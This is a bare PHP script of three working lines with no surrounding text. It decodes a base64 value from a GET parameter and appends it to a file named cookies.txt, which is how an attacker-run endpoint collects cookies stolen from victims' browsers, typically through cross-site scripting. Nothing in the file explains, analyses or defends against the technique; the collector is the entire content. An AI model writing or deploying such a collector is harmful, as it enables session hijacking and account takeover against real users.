<?php
$cookie = base64_decode($_GET['data']);
file_put_contents("cookies.txt", $cookie . "\n", FILE_APPEND);
?>